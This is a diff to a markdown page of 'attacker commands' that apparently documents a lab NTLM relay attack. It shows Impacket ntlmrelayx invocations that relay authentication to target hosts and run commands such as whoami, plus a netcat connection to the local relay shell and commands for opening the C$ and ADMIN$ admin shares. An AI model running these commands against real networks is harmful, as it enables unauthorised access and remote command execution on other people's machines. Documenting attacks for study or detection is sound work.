@@ -1,4 +1,4 @@
-## ATTACKER COMMANDS
+## Attacker Commands
 
 The following are the commands the attacker used while carrying out this attack:
 
@@ -48,7 +48,20 @@ python3 -m pipx install impacket
 ntlmrelayx.py –tf targets.txt –smb2support -i
 ```
 
-#### Executing commands using ntlmrelayx e.g. shell command whoaami
+#### Spawn the reverse shell on the victim machine 
+
+```
+nc 127.0.0.1 11000
+```
+
+#### Netcat commands list
+
+- help - See list of commands
+- shares - See the list of shares
+- use C$ - Access the C file share. C$ requires admin priviledges
+- use ADMIN$ - Access the admin file share i.e. the System32 folder in Windows
+
+#### Executing commands using ntlmrelayx e.g. shell command whoami
 
 ```
 ntlmrelayx –tf targets.txt –smb2support –c “whoami”
